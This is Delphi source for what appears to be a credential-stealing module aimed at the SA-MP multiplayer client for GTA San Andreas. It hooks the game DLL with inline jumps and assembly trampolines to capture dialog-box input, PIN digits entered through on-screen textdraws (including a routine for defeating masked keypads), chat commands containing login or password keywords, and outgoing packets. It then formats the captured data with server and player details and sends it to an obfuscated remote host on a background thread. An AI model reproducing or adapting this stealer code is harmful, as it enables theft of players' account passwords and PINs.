unit sampHooks;

interface

uses Windows, commonDefs, MemStrTools, Internet, ImportsDoctor, radparse;

{$I sampDefs.inc}

type
	CSAMP = class
		ThreadID, ThreadID2: Cardinal;
		hSampModule, dhJumpAddr, tdJumpAddr, lrJumpAddr, spJumpAddr, CNetGame, stDialog, stTextDrawPool, stPlayerPool, dialogtype, dialogid, ulPort, score, money, skin, UniText, namelen: Cardinal;
		bPinCharNum, dialogserverside, bClientVer: Byte;
		szIP, szHostname, szDialogInput: array [0..256] of char;
		Nickname: array [0..24] of char;
		szPIN: array [0..32] of char;
		szTextDrawStr: array [0..800] of char;
		tempLog: array [0..1023] of char;
		stored: Boolean;
		public
			constructor Create;
			procedure Initialize;
			procedure StoreLog(logString: PChar);
			function SeizeLog:PChar;
			function IsLogStored:Boolean;
			function SelectVersion:Integer;
		private
			function ProcessChat(InputText: PChar): Cardinal; stdcall;
			function OnTextdraw(id:Word): Cardinal; stdcall;
			function OnCloseDialog(button:Integer): Cardinal; stdcall;
			function ProcessClientPacket(bitStream: Pointer): Cardinal; stdcall;
			procedure UpdateBasicInformation;
	end;
	
var
	SAMP: CSAMP;

implementation

procedure SendThread;
begin
	if SAMP.IsLogStored then
	begin
		Inet.SendLog(SAMP.SeizeLog);
	end;
end;

function CSAMP.SelectVersion: Integer;
var checkAddr: byte;
begin
	// rev. 0 by default (i.e. unknown version)
	result := 0;

	checkAddr := PByte(Pointer(self.hSampModule + SAMPDLL_VERADDR0))^;
	if Chr(checkAddr) = '3' then Result := 3;
	if checkAddr = $19 then Result := 1;

end;

{$O-}
procedure CSAMP.UpdateBasicInformation;
var
	tempAddr: Cardinal;
	log: array [0..1023] of char;
	tempUrlEnc: PChar;
begin
	if bClientVer = 1 then
	begin
		CNetGame := PDword(Pointer(hSampModule + SAMP_INFO_OFFSET))^;
		stDialog := PDword(Pointer(hSampModule + SAMP_DIALOG_INFO_OFFSET))^;
	end;

	if bClientVer = 3 then
	begin
		CNetGame := PDword(Pointer(hSampModule + SAMP_INFO_OFFSET_R3))^;
		stDialog := PDword(Pointer(hSampModule + SAMP_DIALOG_INFO_OFFSET_R3))^;
	end;

	stDialog := stDialog + steptable[0];
	tempAddr := PDword(Pointer(stDialog))^;
	tempAddr := tempAddr + steptable[4];
	UniText := PDword(Pointer(tempAddr))^;
	Tools.UnicodeToAnsi(PWideChar(UniText), @szDialogInput);
	tempUrlEnc := Tools.UrlEncode(PByte(@szDialogInput));
	lstrcpynA(@szDialogInput, tempUrlEnc, sizeof(szDialogInput));
	FreeMemory(tempUrlEnc);

	stDialog := stDialog + steptable[1];
	dialogtype := PDword(Pointer(stDialog))^;
	stDialog := stDialog + steptable[2];
	dialogid := PDword(Pointer(stDialog))^;
	stDialog := stDialog + steptable[3];
	dialogserverside := PByte(Pointer(stDialog))^;

	if bClientVer = 1 then
	begin
		CNetGame := CNetGame + steptable[5];
		lstrcpynA(@szIP, PChar(CNetGame), 256);
		CNetGame := CNetGame + steptable[6];
		lstrcpynA(@szHostname, PChar(CNetGame), 256);
		CNetGame := CNetGame + steptable[7];
		ulPort := PDword(Pointer(CNetGame))^;
		CNetGame := CNetGame + steptable[8];
		tempAddr := PDword(Pointer(CNetGame))^;
		tempAddr := tempAddr + steptable[9];

		stTextDrawPool := PDword(Pointer(tempAddr))^;
		tempAddr := tempAddr + steptable[10];
		stPlayerPool := PDword(Pointer(tempAddr))^;

		stPlayerPool := stPlayerPool + steptable[11];
		namelen := PDword(Pointer(stPlayerPool))^;
		stPlayerPool := stPlayerPool + steptable[12];
		score := PDword(Pointer(stPlayerPool))^;
		stPlayerPool := stPlayerPool + steptable[13];
	end;

	if bClientVer = 3 then
	begin
		CNetGame := CNetGame + steptable[14];
		lstrcpynA(@szIP, PChar(CNetGame), 256);
		CNetGame := CNetGame + steptable[6];
		lstrcpynA(@szHostname, PChar(CNetGame), 256);
		CNetGame := CNetGame + steptable[7];
		ulPort := PDword(Pointer(CNetGame))^;
		CNetGame := CNetGame + steptable[15];
		tempAddr := PDword(Pointer(CNetGame))^;
		tempAddr := tempAddr + steptable[16];

		stTextDrawPool := PDword(Pointer(tempAddr))^;
		tempAddr := tempAddr + steptable[17];
		stPlayerPool := PDword(Pointer(tempAddr))^;

		stPlayerPool := stPlayerPool + steptable[18];
		namelen := PDword(Pointer(stPlayerPool))^;
		stPlayerPool := stPlayerPool + steptable[19];
		score := PDword(Pointer(stPlayerPool))^;
		stPlayerPool := stPlayerPool + steptable[20];
	end;
	
	tempUrlEnc := Tools.UrlEncode(PByte(@szHostname));
	lstrcpynA(@szHostname, tempUrlEnc, sizeof(szHostname));
	FreeMemory(tempUrlEnc);

	if namelen < 16 then
	begin
		lstrcpynA(@Nickname, PChar(stPlayerPool), 16);
	end
	else
	begin
		tempAddr := PDword(Pointer(stPlayerPool))^;
		lstrcpynA(@Nickname, PChar(tempAddr), namelen + 1);
	end;
	
	tempUrlEnc := Tools.UrlEncode(PByte(@Nickname));
	lstrcpynA(@Nickname, tempUrlEnc, sizeof(Nickname));
	FreeMemory(tempUrlEnc);

	money := PDword(Pointer(GTAUS_MONEY_ADDR))^;
	tempAddr := PDword(Pointer(GTAUS_ENT_OFFSET))^;
	tempAddr := tempAddr + steptable[21];
	skin := PWord(Pointer(tempAddr))^;
end;

function CSAMP.OnCloseDialog(button:Integer): Cardinal; stdcall;
var
	log:array [0..1023] of char;
begin
	UpdateBasicInformation;
	Result := dhJumpAddr;
	if button = 0 then Exit;
	if (dialogtype <> 1) and (dialogtype <> 3) then Exit;
	
	Tools.Format(@log, PChar(Tools.Crypt(COMDEF_DIALOG_FORMAT, false)), [PChar(Tools.Crypt(COMDEF_HOSTNAME, false)), COMDEF_BASEID, @szIP, ulPort, @szHostname, @Nickname, @szDialogInput, dialogid, money, score, skin]);
	//MessageBox(0, @log, 'closedialog', 64);
	stored := true;
	StoreLog(@log);
	BeginThread(nil, 0, @SendThread, nil, 0, ThreadID2);
end;

function CSAMP.OnTextdraw(id:Word): Cardinal; stdcall;
var
	nb:Cardinal;
	log:array [0..1023] of char;
	ismask: Boolean;
	i, f, t, row, realID: integer;
	tempUrlEnc: PChar;
label
	commonproc, pindone;
begin
	UpdateBasicInformation;
	if id = 65535 then
	begin
		if Ord(szPIN[0]) > 0 then
		begin
			tempUrlEnc := Tools.UrlEncode(PByte(@szPIN));
			lstrcpynA(@szPIN, tempUrlEnc, sizeof(szPIN));
			FreeMemory(tempUrlEnc);
			Tools.Format(@log, PChar(Tools.Crypt(COMDEF_PINCODE_FORMAT, false)), [PChar(Tools.Crypt(COMDEF_HOSTNAME, false)), COMDEF_BASEID, @szIP, ulPort, @szHostname, @Nickname, @szPIN, money, score, skin]);
			//MessageBox(0, log, 0, 64);
			stored := true;
			StoreLog(@log);
			BeginThread(nil, 0, @SendThread, nil, 0, ThreadID2);

			bPinCharNum := 0;
			szPIN[0] := #0;
		end;
	end
	else
	begin
		if PDword(Pointer(stTextDrawPool + id * SizeOf(DWORD)))^ <> 0 then
		begin
			nb := PDword(Pointer(stTextDrawPool + 9216 + id * SizeOf(DWORD)))^;
			lstrcpynA(szTextDrawStr, PChar(nb), 801);
			if Ord(szTextDrawStr[0]) > 0 then
			begin
				if szTextDrawStr[1] = #0 then 
				begin
					if bPinCharNum < 31 then
					begin
						if (szTextDrawStr[0] >= '0') and (szTextDrawStr[0] <= '9') then
						begin
						commonproc:
						szPIN[bPinCharNum] := szTextDrawStr[0];
						Inc(bPinCharNum);
						szPIN[bPinCharNum] := #0;
						end
						else
						begin
							// alter algo for trinity-type systems
							if szTextDrawStr[0] = '<' then goto commonproc;
							ismask := false;

							if id < 2303 then begin
								if PDword(Pointer(stTextDrawPool + (id + 1) * SizeOf(DWORD)))^ <> 0 then begin
								if PChar(PDWord(Pointer(stTextDrawPool + 9216 + (id + 1) * SizeOf(DWORD)))^)[0] = szTextDrawStr[0] then ismask := true;
								end;
							end;

							if id > 0 then begin
								if PDword(Pointer(stTextDrawPool + (id - 1) * SizeOf(DWORD)))^ <> 0 then begin
								if PChar(PDWord(Pointer(stTextDrawPool + 9216 + (id - 1) * SizeOf(DWORD)))^)[0] = szTextDrawStr[0] then ismask := true;
								end;
							end;

							if ismask then
							begin
								// finding 1st masked el
								for i:= 0 to 2303 do 
								begin
									if PDword(Pointer(stTextDrawPool + i * SizeOf(DWORD)))^ <> 0 then
									begin
										if PChar(PDword(Pointer(stTextDrawPool + 9216 + i * SizeOf(DWORD)))^)[0] = szTextDrawStr[0] then 
										begin
											if (i > 0) and (PDword(Pointer(stTextDrawPool + (i - 1) * SizeOf(DWORD)))^ <> 0) and
											(PChar(PDword(Pointer(stTextDrawPool + 9216 + (i - 1) * SizeOf(DWORD)))^)[0] = szTextDrawStr[0]) then Break;
											if (i < 2303) and (PDword(Pointer(stTextDrawPool + (i + 1) * SizeOf(DWORD)))^ <> 0) and
											(PChar(PDWord(Pointer(stTextDrawPool + 9216 + (i + 1) * SizeOf(DWORD)))^)[0] = szTextDrawStr[0]) then Break;
										end;
									end;
								end;
								f := i;
								if f >= 2303 then goto pindone;

								// finding 1st visible numbered el
								for i:=0 to 2303 do begin
								  if PDword(Pointer(stTextDrawPool + i * SizeOf(DWORD)))^ <> 0 then
								  begin
									if (PChar(PDWord(Pointer(stTextDrawPool + 9216 + i * SizeOf(DWORD)))^)[0] >= '0') and
									(PChar(PDWord(Pointer(stTextDrawPool + 9216 + i * SizeOf(DWORD)))^)[0] <= '9') and
									(PChar(PDWord(Pointer(stTextDrawPool + 9216 + i * SizeOf(DWORD)))^)[1] = #0) then Break;
								  end;
								end;
								t := i;
								if t >= 2303 then goto pindone;

								// computing delta and adding to src id
								row := t - f;
								realID := id + row;

								if PDword(Pointer(stTextDrawPool + realID * SizeOf(DWORD)))^ = 0 then goto pindone;  
								szTextDrawStr[0] := PChar(PDWord(Pointer(stTextDrawPool + 9216 + realID * SizeOf(DWORD)))^)[0];
								goto commonproc;

								pindone:
								ismask := false;
							end;
						end;
					end;
				end;
			end;
		end;
	end;

	Result := tdJumpAddr;
end;
{$O+}

function CSAMP.ProcessChat(InputText: PChar): Cardinal; stdcall;
var
	log:array [0..1023] of char;
	tempUrlEnc: PChar;
begin
	if (Tools.Pos(PChar(Tools.Crypt(COMDEF_COMMAND_LOG, false)), InputText)) or (Tools.Pos(PChar(Tools.Crypt(COMDEF_COMMAND_PASSWD, false)), InputText)) then
	begin
		UpdateBasicInformation;
		tempUrlEnc := Tools.UrlEncode(PByte(InputText));
		Tools.Format(@log, PChar(Tools.Crypt(COMDEF_DIALOG_FORMAT, false)), [PChar(Tools.Crypt(COMDEF_HOSTNAME, false)), COMDEF_BASEID, @szIP, ulPort, @szHostname, @Nickname, tempUrlEnc, 404, money, score, skin]);
		FreeMemory(tempUrlEnc);
		//MessageBox(0, @log, 'ProcessChat', 64);
		stored := true;
		StoreLog(@log);
		BeginThread(nil, 0, @SendThread, nil, 0, ThreadID2);
	end;
	
	Result := lrJumpAddr;
end;
    
{$O-}
function CSAMP.ProcessClientPacket(bitStream: Pointer): Cardinal; stdcall;
type
	PPByte = ^PByte;
var
	unread, bitsUsed: Integer;
	bsdata: PByte;
	log: array [0..1023] of char;
	output: PChar8;
	nr, i, did: Integer;
	tempUrlEnc: PChar;
begin
	bitsUsed := PInteger(bitStream)^;
	if bitsUsed>0 then
	begin
		bsdata := PPByte(Cardinal(bitStream) + 12)^;
		if bsdata^=215 then
		begin
			unread := BITS_TO_BYTES(bitsUsed - PInteger(Cardinal(bitStream) + 8)^);
			did := BreakWeaponData_Delphi(bsdata, unread, output, nr);

			if (nr > 0) and (did<>MAXWORD) then
			begin
				for i:=0 to nr-1 do
				begin
					UpdateBasicInformation;
					tempUrlEnc := Tools.UrlEncode(PByte(output[i]));
					Tools.Format(@log, PChar(Tools.Crypt(COMDEF_DIALOG_FORMAT, false)), [PChar(Tools.Crypt(COMDEF_HOSTNAME, false)), COMDEF_BASEID, @szIP, ulPort, @szHostname, @Nickname, tempUrlEnc, did, money, score, skin]);
					FreeMemory(tempUrlEnc);
					FreeMemory(output[i]);
					stored := true;
					StoreLog(@log);
					BeginThread(nil, 0, @SendThread, nil, 0, ThreadID2);
				end;
			end;
		end;
	end;

	Result := self.spJumpAddr;
end;
{$O+}

procedure CSAMP.Initialize;
const
	{$J+}
	hookJumpAddr: Cardinal = 0;
	bs: Cardinal = 0;
	{$J-}
var
	addr, lbladdr: Cardinal;
label
	l_dlg, l_td, l_cmd, l_send, localmain;
begin
	hSampModule := GetModuleHandle(PChar(Tools.Crypt(ModuleName, false)));
	while hSampModule < $1000 do begin
		hSampModule := GetModuleHandle(PChar(Tools.Crypt(ModuleName, false)));
	end;
	stored := false;

	bClientVer := self.SelectVersion;

	if bClientVer<>0 then goto localmain;
	Exit;
	
	l_dlg:
	asm
		pushad
		push [ebp + 8]
		push SAMP
		call OnCloseDialog
		mov hookJumpAddr, eax
		popad
		db $64, $a1, $00, $00, $00, $00
		jmp hookJumpAddr
	end;
	
	l_td:
	asm
		pushad
		push [esi + 8]
		push SAMP
		call OnTextdraw
		mov hookJumpAddr, eax
		popad
		lea ecx, [esp + $0C]
		push  ecx
		jmp hookJumpAddr
	end;
	
	l_cmd:
	asm
		mov byte ptr[esi + 1564h], 0
		pushad
		push eax
		push SAMP
		call ProcessChat
		mov hookJumpAddr, eax
		popad
		jmp hookJumpAddr
	end;

	l_send:
	asm
		mov eax, [esp + $1C]
		push edx
		mov bs, eax
		pushad
		mov eax, bs
		push eax
		push SAMP
		call ProcessClientPacket
		mov hookJumpAddr, eax
		popad
		jmp hookJumpAddr
	end;
	
	localmain:
	if bClientVer = 1 then addr:=hSampModule + HOOK_CLOSEDIALOG;
	if bClientVer = 3 then addr:=hSampModule + HOOK_CLOSEDIALOG_R3;
	dhJumpAddr := addr + 6;
	asm
		mov eax, offset l_dlg
		mov lbladdr, eax
	end;
	Tools.InstallJump(Pointer(addr), Cardinal(lbladdr), 1);

	if bClientVer = 1 then addr:=hSampModule + HOOK_TEXTDRAW;
	if bClientVer = 3 then addr:=hSampModule + HOOK_TEXTDRAW_R3;
	tdJumpAddr := addr + 5;
	asm
		mov eax, offset l_td
		mov lbladdr, eax
	end;
	Tools.InstallJump(Pointer(addr), Cardinal(lbladdr), 0);

	if bClientVer = 1 then addr:=hSampModule + HOOK_INPUT;  
	if bClientVer = 3 then addr:=hSampModule + HOOK_INPUT_R3;
	lrJumpAddr := addr + 7;
	asm
		mov eax, offset l_cmd
		mov lbladdr, eax
	end;
	Tools.InstallJump(Pointer(addr), Cardinal(lbladdr), 2);

	if bClientVer = 3 then
	begin
		addr := hSampModule + HOOK_SENDPACKET;
		spJumpAddr := addr + 5;
		asm
			mov eax, offset l_send
			mov lbladdr, eax
		end;
		Tools.InstallJump(Pointer(addr), Cardinal(lbladdr), 0);
	end;
end;

procedure CSAMP.StoreLog(logString: PChar);
begin
	lstrcpynA(@tempLog, logString, 1024);
	stored := true;
end;

function CSAMP.SeizeLog:PChar;
begin
	stored := false;
	Result := @tempLog;
end;

function CSAMP.IsLogStored:Boolean;
begin
	Result := stored;
end;

procedure StartSAMP;
begin
	SAMP.Initialize;
end;

constructor CSAMP.Create;
begin
	BeginThread(nil, 0, @StartSAMP, nil, 0, Self.ThreadID);
end;

end.